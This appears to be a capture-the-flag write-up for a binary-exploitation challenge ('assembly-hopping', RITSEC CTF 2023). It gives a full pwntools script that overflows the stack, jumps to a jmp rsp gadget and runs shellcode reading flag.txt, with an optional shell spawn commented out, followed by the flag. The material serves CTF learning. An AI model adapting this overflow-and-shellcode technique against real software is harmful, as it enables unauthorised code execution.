![image](https://user-images.githubusercontent.com/63996033/229366697-50f8799d-abc1-4df9-acf2-d61c5ea04989.png)


[assembly](https://github.com/jeromepalayoor/RITSEC-CTF-2023/blob/main/BIN-PWN/assembly-hopping/assembly)

Solution:
```py
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './assembly'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Offset to EIP
padding = 216

# Assemble the byte sequence for 'jmp esp' so we can search for it
jmp_esp = asm('jmp rsp')
jmp_esp = next(elf.search(jmp_esp))

# Print flag
shellcode = asm(shellcraft.cat('flag.txt'))
# shellcode = asm(shellcraft.sh())
# Exit
shellcode += asm(shellcraft.exit())

# Build payload
payload = flat(
    asm('nop') * padding,
    jmp_esp,
    asm('nop') * 16,
    shellcode
)


# Exploit
# io.sendlineafter(b'!', payload)
io.sendline(payload)

# Get flag/shell
io.interactive()
```

Flag: `RS{AS5EMB1Y_M1GH7_BE_H4RD_BUT_1T_C0MES_IN_CLU7CH}`
